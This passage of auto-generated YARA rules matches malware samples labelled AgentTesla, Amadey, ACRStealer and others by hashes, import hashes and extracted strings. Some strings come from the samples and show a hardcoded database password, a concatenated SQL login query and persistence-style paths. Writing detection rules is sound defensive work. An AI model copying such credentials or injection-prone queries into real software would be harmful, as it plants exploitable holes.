      $s8 = "UpdateLogInfo" fullword ascii /* score: '15.00'*/
      $s9 = "EventLogAnalyzer.Forms.ErrorPatternForm.resources" fullword ascii /* score: '15.00'*/
      $s10 = "Error reading event log '" fullword wide /* score: '15.00'*/
      $s11 = "EventLog_Analysis_{0}_{1:yyyyMMdd_HHmmss}.csv" fullword wide /* score: '15.00'*/
      $s12 = "<GetEventLogStatistics>b__5_2" fullword ascii /* score: '14.00'*/
      $s13 = "<GetEventLogStatistics>b__5_0" fullword ascii /* score: '14.00'*/
      $s14 = "<GetAvailableEventLogs>b__6_0" fullword ascii /* score: '14.00'*/
      $s15 = "<GetEventLogStatistics>b__5_1" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__3fd465b2_AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5_35 {
   meta:
      description = "_subset_batch - from files a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3fd465b2.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5c96c8a9.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3fd465b2244aeb9a818ba68def94cf01769536f3cbcd6242008cba3497fab594"
      hash2 = "5c96c8a9e1a10b82da21641a3f0a06fac7ae79e830c90281375afdd6e9072e61"
   strings:
      $s1 = "\\SERVER=localhost; Database=used_cars; UID=root; Password=dumbdaddy;allow user variables=true" fullword ascii /* score: '20.00'*/
      $s2 = "Login Failed !" fullword wide /* score: '18.00'*/
      $s3 = "select * from users where u_pass=md5('" fullword wide /* score: '16.00'*/
      $s4 = "Login_Load" fullword ascii /* score: '15.00'*/
      $s5 = "Login_Shown" fullword ascii /* score: '15.00'*/
      $s6 = "Used_cars.Presentation.Login.resources" fullword ascii /* score: '15.00'*/
      $s7 = "Password change Failed" fullword wide /* score: '15.00'*/
      $s8 = "Login Information" fullword wide /* score: '15.00'*/
      $s9 = "Login Failed... " fullword wide /* score: '13.00'*/
      $s10 = "Change_Password_Load" fullword ascii /* score: '12.00'*/
      $s11 = "Change_Password" fullword wide /* score: '12.00'*/
      $s12 = "changePasswordToolStripMenuItem_Click" fullword ascii /* score: '12.00'*/
      $s13 = "btn_login" fullword wide /* score: '12.00'*/
      $s14 = "changePasswordToolStripMenuItem" fullword wide /* score: '12.00'*/
      $s15 = "Password changed" fullword wide /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834_959833eb_9a87d04294becdf4a20c7335e1cc607c20c666cace04d722c_36 {
   meta:
      description = "_subset_batch - from files 959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834_959833eb.elf, 9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042_9a87d042.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834"
      hash2 = "9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042"
   strings:
      $x1 = "unsafe.String: len out of rangereflect: Len of non-array type reflect.MakeSlice: negative lenreflect.MakeSlice: negative capenco" ascii /* score: '72.50'*/
      $x2 = "MapIter.Value called on exhausted iteratorx509: %q cannot be encoded as an IA5Stringx509: RSA modulus is not a positive numberwe" ascii /* score: '66.50'*/
      $x3 = "lock: lock countbad system huge page sizearena already initialized to unused region of spanunaligned sysNoHugePageOS/sched/gomax" ascii /* score: '65.50'*/
      $x4 = "/cpu/classes/idle:cpu-seconds/cpu/classes/user:cpu-seconds/gc/heap/allocs-by-size:bytes/gc/stack/starting-size:bytesgc done but " ascii /* score: '57.50'*/
      $x5 = "invalid hostname: /dev/misc/watchdogreceived from peerframe_goaway_shortproxy-authenticateUNKNOWN_SETTING_%dGo-http-client/2.0Go" ascii /* score: '51.00'*/
      $x6 = "3552713678800500929355621337890625too many references: cannot splice: day-of-year does not match monthslice bounds out of range " ascii /* score: '46.50'*/
      $x7 = "sigaction failedexec: no command: value of type binary.BigEndianContent-Languageinvalid encodingGODEBUG: value \"len(x) != len(z" ascii /* score: '46.00'*/
      $x8 = "/etc/profile.d/bash.cfg/usr/lib/libgdi.so.0.8.2 { proc_name=$(/usr/bin/unexpected buffer len=%vinvalid pseudo-header %qframe_hea" ascii /* score: '46.00'*/
      $x9 = "mstartm not found in allmstopm holding lockssemaRoot rotateLeftbad notifyList sizeruntime: preempt g0runtime: pcdata is dodeltim" ascii /* score: '39.00'*/
      $x10 = "stack not a power of 2minpc or maxpc invalidtrace: alloc too largenon-Go function at pc=unexpected method stepreflect.Value.MapI" ascii /* score: '38.00'*/
      $x11 = " ptrSize=  targetpc= until pc=unknown pcruntime: ggoroutine execerrdotcomplex128t.Kind == SHA256-RSASHA384-RSASHA512-RSADSA-SHA2" ascii /* score: '35.50'*/
      $x12 = "stopm spinning nmidlelocked= needspinning=store64 failedmemprofileratesemaRoot queuebad allocCountbad span statestack overflow u" ascii /* score: '35.00'*/
      $x13 = "/etc/init.d/boot.localIPv6: no supported yethttp2: frame too largewrite on closed bufferframe_data_pad_too_bigaccess-control-max" ascii /* score: '32.00'*/
      $s14 = "ProcessingNo ContentRST_STREAMEND_STREAMresumptionres binderres masterexp master12207031256103515625owner diedterminated/setgrou" ascii /* score: '30.00'*/
      $s15 = "sigaction failedexec: no command: value of type binary.BigEndianContent-Languageinvalid encodingGODEBUG: value \"len(x) != len(z" ascii /* score: '28.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__634e1405_AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5_37 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_634e1405.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_90d2796b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "634e140524f023482bdc5754c81245f02c004c4b8c30e9a9071f7d0a239a6b4a"
      hash2 = "90d2796b17d8b141222533ebef8bd0c92f0ea82930f89563f66c327bd505384b"
   strings:
      $s1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3agSystem.Drawing.Point, Sy" ascii /* score: '27.00'*/
      $s2 = "stem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, System.Drawing, Version=4" ascii /* score: '27.00'*/
      $s3 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3agSystem.Drawing.Point, Sy" ascii /* score: '27.00'*/
      $s4 = "Select * From Table_Secretarys Where SecretaryTC=@p1 and SecretaryPassword=@p2" fullword wide /* score: '19.00'*/
      $s5 = "The deletion process failed" fullword wide /* score: '18.00'*/
      $s6 = "Select * from Table_Patients where PatientTC=@p1 and PatientPassWord=@p2" fullword wide /* score: '16.00'*/
      $s7 = "The deletion process is successful" fullword wide /* score: '15.00'*/
      $s8 = "get_HospitalDataBaseConnectionString" fullword ascii /* score: '12.00'*/
      $s9 = "Select DoctorTC,DoctorPassword From Table_Doctors Where DoctorTC=@p1 and DoctorPassword=@p2" fullword wide /* score: '12.00'*/
      $s10 = "You entered the wrong TC or PASSWORD !!" fullword wide /* score: '12.00'*/
      $s11 = "PASSWORD:" fullword wide /* score: '12.00'*/
      $s12 = "Update Table_Doctors Set DoctorFirstName=@p1,DoctorSurName=@p2,DoctorBranch=@p3,DoctorTC=@p4,DoctorPassword=@p5 Where DoctorTC=@" wide /* score: '12.00'*/
      $s13 = "Select DoctorFirstName,DoctorSurName,DoctorBranch,DoctorPassword From Table_Doctors Where DoctorTC=@p1" fullword wide /* score: '12.00'*/
      $s14 = "Update Table_Patients set PatientFirstName=@p1,PatientSurName=@p2,PatientTC=@p3,PatientPhone=@p4,PatientPassword=@p5,PatientGend" wide /* score: '12.00'*/
      $s15 = "INSERT INTO Table_Patients(PatientFirstName,PatientSurname,PatientTC,PatientPhone,PatientPassword,PatientGender) VALUES (@p1,@p2" wide /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _837fe6c9e243ff99b6590b36278aa82c_imphash__AgentTesla_signature__6d242744_AgentTesla_signature__799e73863806df2964d80d12ce4e_38 {
   meta:
      description = "_subset_batch - from files 837fe6c9e243ff99b6590b36278aa82c(imphash).exe, AgentTesla(signature)_6d242744.tar, AgentTesla(signature)_799e73863806df2964d80d12ce4e61ea(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "da061f2bdb2a6d84d3e7d6b2045834655fe65418e9ad7281b4b689a3700dc003"
      hash2 = "6d242744cbee7249a48505d1447d984e9c912b904be4ea3dcccd07602ef5264d"
      hash3 = "7b3d435d322d7303446c5ce3308704a1d4d5a5b1e70abb44a19502be6baf2c79"
   strings:
      $s1 = "System.Runtime, Version=4.2.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a,DeserializationTracker,SerializationException*" ascii /* score: '27.00'*/
      $s2 = "HSystem.ComponentModel.Primitives.dllDSystem.Diagnostics.FileVersionInfo" fullword ascii /* score: '25.00'*/
      $s3 = "QueueTask(TryExecuteTaskInline2GetTaskForValueTaskSource@" fullword ascii /* score: '23.00'*/
      $s4 = "System.Runtime, Version=4.2.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a,DeserializationTracker,SerializationException*" ascii /* score: '23.00'*/
      $s5 = ".ThrowForFailedGetResult SignalCompletionnSystem.Collections.Generic.IEnumerable<T>.GetEnumerator@" fullword ascii /* score: '18.00'*/
      $s6 = "FileVersionInfo\"ProcessWaitHandle4SYSTEM_PROCESS_INFORMATIONS" fullword ascii /* score: '18.00'*/
      $s7 = "Processg" fullword ascii /* score: '17.00'*/
      $s8 = "0ExecutionContextCallback$get_MoveNextAction@" fullword ascii /* score: '17.00'*/
      $s9 = "ExecutionDomain" fullword ascii /* score: '16.00'*/
      $s10 = "ExecutionEngineException previously indicated an unspecified fatal error in the runtime. The runtime no longer raises this excep" ascii /* score: '15.00'*/
      $s11 = "zSystem.Collections.Generic.IEnumerable<TSource>.GetEnumerator" fullword ascii /* score: '15.00'*/
      $s12 = "System.Threading.Tasks.Sources.IValueTaskSource<TResult>.GetResult" fullword ascii /* score: '15.00'*/
      $s13 = "WIN32_FIND_DATA.PROCESS_MEMORY_COUNTERS:TIME_DYNAMIC_ZONE_INFORMATION PROCESSOR_NUMBER\"OBJECT_ATTRIBUTES" fullword ascii /* score: '15.00'*/
      $s14 = ".ProcessModuleCollection" fullword ascii /* score: '15.00'*/
      $s15 = "ProcessModuleg" fullword ascii /* score: '15.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x7061 ) and filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

rule _83361db2306f393fa5e8311bfba7019c7acf9bb95cf61ecf7aab09ab5e5a2dae_83361db2_959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ec_39 {
   meta:
      description = "_subset_batch - from files 83361db2306f393fa5e8311bfba7019c7acf9bb95cf61ecf7aab09ab5e5a2dae_83361db2.elf, 959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834_959833eb.elf, 98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5_98e8eaed.elf, 9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042_9a87d042.elf, 9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, 9cbefe68f395e67356e2a5d8d1b285c0(imphash)_04537b68.exe, 9cbefe68f395e67356e2a5d8d1b285c0(imphash)_4cfe5a07.exe, a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b_a1ff420c.elf, ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2_ab0306ce.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "83361db2306f393fa5e8311bfba7019c7acf9bb95cf61ecf7aab09ab5e5a2dae"
      hash2 = "959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834"
      hash3 = "98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5"
      hash4 = "9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042"
      hash5 = "1005065810ae3c06e48ea42e790775bd003451a8aea76a25331cbe9a55f701f2"
      hash6 = "04537b68ef029a66a16e85052f829b6f6cc969fefe894e0c55f8048cc5ad74a6"
      hash7 = "4cfe5a076f8b5aeedafccaff49969c10d09468bbb795075099f10974248c23f8"
      hash8 = "a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b"
      hash9 = "ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2"
   strings:
      $s1 = "runtime.injectglist.func1" fullword ascii /* score: '20.00'*/
      $s2 = "runtime.errorAddressString.Error" fullword ascii /* score: '16.00'*/
      $s3 = "runtime.headTailIndex.split" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.(*activeSweep).end" fullword ascii /* score: '15.00'*/
      $s5 = "runtime.gfget.func2" fullword ascii /* score: '15.00'*/
      $s6 = "runtime.(*mSpanStateBox).get" fullword ascii /* score: '15.00'*/
      $s7 = "runtime.gcPaceSweeper" fullword ascii /* score: '15.00'*/
      $s8 = "runtime.sweepone.func1" fullword ascii /* score: '15.00'*/
      $s9 = "runtime.sysFreeOS" fullword ascii /* score: '14.00'*/
      $s10 = "runtime.sysUsedOS" fullword ascii /* score: '14.00'*/
      $s11 = "runtime.(*goroutineProfileStateHolder).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s12 = "runtime.sysReserveOS" fullword ascii /* score: '14.00'*/
      $s13 = "runtime.sysFaultOS" fullword ascii /* score: '14.00'*/
      $s14 = "targetCPUFraction" fullword ascii /* score: '14.00'*/
      $s15 = "runtime.(*gcControllerState).commit" fullword ascii /* score: '14.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 21000KB and pe.imphash() == "9cbefe68f395e67356e2a5d8d1b285c0" and ( 8 of them )
      ) or ( all of them )
}

rule _a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__01936ea3_AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5_40 {
   meta:
      description = "_subset_batch - from files a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_01936ea3.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_aa50db8f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "01936ea3ab14ecadbc3ab003a97f78fcc82cc70b9f1a093ebc997cb587049ac4"
      hash2 = "aa50db8fd4b257be137a26e58373238bcce1c552438415d9adb06a9e12a45da7"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADkF" fullword ascii /* score: '27.00'*/
      $s2 = "support@lotterysimulation.com" fullword wide /* score: '21.00'*/
      $s3 = "http://tempuri.org/DataSet1.xsd" fullword wide /* score: '17.00'*/
      $s4 = "https://github.com/lottery-simulation" fullword wide /* score: '17.00'*/
      $s5 = "Lottery Simulation - Main" fullword wide /* score: '12.00'*/
      $s6 = "get_AutoSaveHistory" fullword ascii /* score: '9.00'*/
      $s7 = "columnHeaderTime" fullword ascii /* score: '9.00'*/
      $s8 = "columnHeaderMostPercent" fullword ascii /* score: '9.00'*/
      $s9 = "get_DefaultMinValue" fullword ascii /* score: '9.00'*/
      $s10 = "columnHeaderMostNumber" fullword ascii /* score: '9.00'*/
      $s11 = "columnHeaderLeastNumber" fullword ascii /* score: '9.00'*/
      $s12 = "columnHeaderLeastFreq" fullword ascii /* score: '9.00'*/
      $s13 = "columnHeaderSum" fullword ascii /* score: '9.00'*/
      $s14 = "columnHeaderNumbers" fullword ascii /* score: '9.00'*/
      $s15 = "get_DefaultMaxValue" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__7b7e52fb_a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5_41 {
   meta:
      description = "_subset_batch - from files a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7b7e52fb.exe, a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dc822bf7.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5b287d4a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "7b7e52fb36207d89ab15876a165804032a70437b1eb56634ba58b548ce1eaada"
      hash2 = "dc822bf7d695ba868679506e564c997c5ff7c2ec8db8b7c8a4606a79a28a9ac3"
      hash3 = "5b287d4a2e0a8b69148ff5ac3f971e27de37f3332c4239c2d2b25762b855655d"
   strings:
      $s1 = "C:\\Users\\User\\Documents" fullword ascii /* score: '24.00'*/
      $s2 = "comparison_report_{0:yyyyMMdd_HHmmss}.txt" fullword wide /* score: '20.00'*/
      $s3 = "<ProcessorCount>k__BackingField" fullword ascii /* score: '15.00'*/
      $s4 = "set_ProcessorCount" fullword ascii /* score: '15.00'*/
      $s5 = "Baseline [{0:yyyy-MM-dd HH:mm:ss}] - CPU: {1:F1}%, Memory: {2:F1}%, Disk: {3:F1}%, Network: {4:F1} Mbps" fullword wide /* score: '15.00'*/
      $s6 = "Processors: {0}" fullword wide /* score: '15.00'*/
      $s7 = "Win32_Processor.DeviceID='CPU0'" fullword wide /* score: '15.00'*/
      $s8 = "SELECT Name, MaxClockSpeed FROM Win32_Processor" fullword wide /* score: '15.00'*/
      $s9 = "Comparison Results (Baseline 2 - Baseline 1)" fullword wide /* score: '15.00'*/
      $s10 = "GetMemoryUsage" fullword ascii /* score: '14.00'*/
      $s11 = "GetMemoryUsageAlternative" fullword ascii /* score: '14.00'*/
      $s12 = "GetCpuUsage" fullword ascii /* score: '14.00'*/
      $s13 = "get_CpuUsage" fullword ascii /* score: '14.00'*/
      $s14 = "<GetDiskUsageAlternative>b__14_0" fullword ascii /* score: '14.00'*/
      $s15 = "GetNetworkUsage" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Amadey_signature__646167cce332c1c252cdcb1839e0cf48_imphash__Amadey_signature__646167cce332c1c252cdcb1839e0cf48_imphash__2f9_42 {
   meta:
      description = "_subset_batch - from files Amadey(signature)_646167cce332c1c252cdcb1839e0cf48(imphash).exe, Amadey(signature)_646167cce332c1c252cdcb1839e0cf48(imphash)_2f994afc.exe, Amadey(signature)_646167cce332c1c252cdcb1839e0cf48(imphash)_445942fa.exe, Amadey(signature)_646167cce332c1c252cdcb1839e0cf48(imphash)_56be345b.exe, Amadey(signature)_646167cce332c1c252cdcb1839e0cf48(imphash)_5ea0191c.exe, Amadey(signature)_646167cce332c1c252cdcb1839e0cf48(imphash)_77f11525.exe, Amadey(signature)_646167cce332c1c252cdcb1839e0cf48(imphash)_7dba4ff4.exe, Amadey(signature)_646167cce332c1c252cdcb1839e0cf48(imphash)_c7704746.exe, Amadey(signature)_646167cce332c1c252cdcb1839e0cf48(imphash)_c9f1a71f.exe, Amadey(signature)_646167cce332c1c252cdcb1839e0cf48(imphash)_e07d2fef.exe, Amadey(signature)_646167cce332c1c252cdcb1839e0cf48(imphash)_e100eccb.exe, Amadey(signature)_646167cce332c1c252cdcb1839e0cf48(imphash)_ed955efb.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "ba3a747d829753dce2ce2c0da4e37de3f2278aac6cdb9e5862fdb5dba773fe76"
      hash2 = "2f994afc548d528e56a029cf4481d56a3459d438b46ec38403a977bc7d70dced"
      hash3 = "445942faf30b3702fb89068a9b0d09ac610cd095d5bf53e8a80b49980a845c54"
      hash4 = "56be345b2a3d73fb2d7090c24fdfc4c91a51a274b1479af67551c234ef621758"
      hash5 = "5ea0191ccd4826be28df2e9cbfa70ec8de8089e603c82f60c4cc084256403941"
      hash6 = "77f11525ac59b108e166cb9a4e834fceeb825d74a8d991f948e881d1002bdd13"
      hash7 = "7dba4ff42e05f8842289bf59928f9c685d748831973ba97505ac6967d4896556"
      hash8 = "c7704746a942b625eb4536ad8976902a8fe42b8e2311b95437c39597a24552aa"
      hash9 = "c9f1a71f0ee9a633fb2c6213cc1c662f7affe237df479344082094564b2ebcb2"
      hash10 = "e07d2fef8e2284c09023f1e2e4c9ee34c3f3e89104217c1e28de3aba4abe269c"
      hash11 = "e100eccbcb4efb264a449ac9ad7faacc2192be5317ec45bdefcfbf227c6ce05f"
      hash12 = "ed955efb4b643251a35e36c4a801e4edfddcf673e39fbf14790cbbf1407d22f1"
   strings:
      $s1 = " Shell32.DLL " fullword wide /* score: '24.00'*/
      $s2 = " OpenProcessToken.3" fullword wide /* score: '18.00'*/
      $s3 = " advpack.dll.H" fullword wide /* score: '16.00'*/
      $s4 = " Command /?." fullword wide /* score: '14.00'*/
      $s5 = "        <requestedExecutionLevel" fullword ascii /* score: '11.00'*/
      $s6 = "  <description>IExpress extraction tool</description>" fullword ascii /* score: '10.00'*/
      $s7 = "DSystem\\CurrentControlSet\\Control\\Session Manager" fullword ascii /* score: '10.00'*/
      $s8 = "     processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s9 = "          processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s10 = " Windows NT." fullword wide /* score: '9.00'*/
      $s11 = "/Q -- " fullword wide /* score: '9.00'*/
      $s12 = "/C -- " fullword wide /* score: '9.00'*/
      $s13 = "  <assemblyIdentity version=\"5.1.0.0\"" fullword ascii /* score: '8.00'*/
      $s14 = " GetProcAddress() " fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 14000KB and pe.imphash() == "646167cce332c1c252cdcb1839e0cf48" and ( 8 of them )
      ) or ( all of them )
}

rule _aee2d95a831668fd42f12ee662129072_imphash__aee2d95a831668fd42f12ee662129072_imphash__9bacc135_aee2d95a831668fd42f12ee6621290_43 {
   meta:
      description = "_subset_batch - from files aee2d95a831668fd42f12ee662129072(imphash).exe, aee2d95a831668fd42f12ee662129072(imphash)_9bacc135.exe, aee2d95a831668fd42f12ee662129072(imphash)_e96955ba.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "ed2a9db9192e60df4014053b09602adeed2864e894c2683ee3b965cec0b7b991"
      hash2 = "9bacc135086ab35abf6e587894f4dfe24a3d5f6408114513b7940b0b2c70b10a"
      hash3 = "e96955ba46294e3dabf927513e11afbdbef750c1113f93b89faa5591d539502e"
   strings:
      $s1 = "[+] Connection closed" fullword ascii /* score: '20.00'*/
      $s2 = "[+] Usage: %s <RemoteIP> <RemotePort> <Resource>" fullword ascii /* score: '19.00'*/
      $s3 = " http://www.microsoft.com/windows0" fullword ascii /* score: '17.00'*/
      $s4 = "PROCESSOR_ATHLON" fullword ascii /* score: '15.00'*/
      $s5 = "PROCESSOR_HASWELL" fullword ascii /* score: '15.00'*/
      $s6 = "PROCESSOR_CORE2" fullword ascii /* score: '15.00'*/
      $s7 = "PROCESSOR_KNM" fullword ascii /* score: '15.00'*/
      $s8 = "PROCESSOR_PENTIUMPRO" fullword ascii /* score: '15.00'*/
      $s9 = "PROCESSOR_PENTIUM" fullword ascii /* score: '15.00'*/
      $s10 = "PROCESSOR_AMDFAM10" fullword ascii /* score: '15.00'*/
      $s11 = "PROCESSOR_K8" fullword ascii /* score: '15.00'*/
      $s12 = "PROCESSOR_ICELAKE_CLIENT" fullword ascii /* score: '15.00'*/
      $s13 = "PROCESSOR_BDVER2" fullword ascii /* score: '15.00'*/
      $s14 = "PROCESSOR_ICELAKE_SERVER" fullword ascii /* score: '15.00'*/
      $s15 = "PROCESSOR_SANDYBRIDGE" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and pe.imphash() == "aee2d95a831668fd42f12ee662129072" and ( 8 of them )
      ) or ( all of them )
}

rule _8059e25d7b32449cfecfb5f0a2169a65_imphash__ACRStealer_signature__6faee67a691b5510cdbffa2f65fadb6a_imphash__ACRStealer_signat_44 {
   meta:
      description = "_subset_batch - from files 8059e25d7b32449cfecfb5f0a2169a65(imphash).exe, ACRStealer(signature)_6faee67a691b5510cdbffa2f65fadb6a(imphash).exe, ACRStealer(signature)_9cc15cdc74e45b23babe8504d7c15a1c(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "2d04c70f3bcf3e4f8fda71c3050e3f8a457bf47da11375b564fa0a78ff172d3f"
      hash2 = "30496079ebff4b88222a5d91611c8a7a8be8d86f9abd83814285db371b9b63df"
      hash3 = "b774f46b3d842199a93a7f2f0474153e62fc0fc95fe3fc731aaf3883782517d2"
   strings:
      $s1 = "X509_VERIFY_PARAM_get_auth_level" fullword ascii /* score: '12.00'*/
      $s2 = "X509_STORE_get0_objects" fullword ascii /* score: '9.00'*/
      $s3 = "X509_get0_notAfter" fullword ascii /* score: '9.00'*/
      $s4 = "X509_OBJECT_get0_X509" fullword ascii /* score: '9.00'*/
      $s5 = "X509_get0_notBefore" fullword ascii /* score: '9.00'*/
      $s6 = "X509_OBJECT_get_type" fullword ascii /* score: '9.00'*/
      $s7 = "ASN1_INTEGER_get_int64" fullword ascii /* score: '9.00'*/
      $s8 = "EC_KEY_get_ex_data" fullword ascii /* score: '9.00'*/
      $s9 = "X509_STORE_get0_param" fullword ascii /* score: '9.00'*/
      $s10 = "EC_GROUP_get0_cofactor" fullword ascii /* score: '9.00'*/
      $s11 = "X509_get0_pubkey" fullword ascii /* score: '9.00'*/
      $s12 = "X509_REQ_get0_pubkey" fullword ascii /* score: '9.00'*/
      $s13 = "BN_GENCB_get_arg" fullword ascii /* score: '9.00'*/
      $s14 = "EC_GROUP_get0_order" fullword ascii /* score: '9.00'*/
      $s15 = "X509_REQ_get_subject_name" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__20904547_Amadey_signature__f34d5f2d4577ed6d9ceec516c1f5a744_45 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_20904547.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_11c21d87.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "20904547a31f2d227b7340bdbe384902d173dcfdf3a45797eef36a5cf0d0518d"
      hash2 = "11c21d873335c6d7e8a4a349716e5bd34f25fcd0353e296771c2765c8a3bc66c"
   strings:
      $s1 = "Ampersand '&' should be encoded as '&amp;'" fullword wide /* score: '16.00'*/
      $s2 = "Attribute syntax error - attributes should be in format: name=\"value\"" fullword wide /* score: '15.00'*/
      $s3 = "HTML_Validation_Errors.txt" fullword wide /* score: '14.00'*/
      $s4 = "get_HTMLVersion" fullword ascii /* score: '12.00'*/
      $s5 = "get_SaveValidationReports" fullword ascii /* score: '12.00'*/
      $s6 = "Line {0}: {1} - {2}" fullword wide /* score: '12.00'*/
      $s7 = "Help - HTML Validator" fullword wide /* score: '12.00'*/
      $s8 = "Empty Content" fullword wide /* score: '11.00'*/
      $s9 = "btnExportErrors_Click" fullword ascii /* score: '10.00'*/
      $s10 = "btnExportErrors" fullword wide /* score: '10.00'*/
      $s11 = "RA comprehensive HTML validation tool for checking markup syntax and finding errors" fullword ascii /* score: '10.00'*/
      $s12 = "HTMLValidator.Forms.ValidationErrorsForm.resources" fullword ascii /* score: '10.00'*/
      $s13 = "Add alt=\"description\" to the image tag" fullword wide /* score: '10.00'*/
      $s14 = "Error reading file: " fullword wide /* score: '10.00'*/
      $s15 = "HTML Validation Errors Report" fullword wide /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__72c64472_a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5_46 {
   meta:
